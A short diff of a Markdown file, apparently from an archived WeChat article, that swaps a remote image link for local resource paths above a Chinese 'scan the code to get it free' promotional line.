+![](../../.resource/remote/cfe2acf01f76856e34009a3a3c80c59c96367595d7f9dcf72cf3031cd3ac7641.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)
+![](../../.resource/remote/cc23fa1d3e8157e15633c47bc376e29fa74b67c7beeba492c693ff51db3d83c5.png)
 
  **扫码白嫖****！**
 
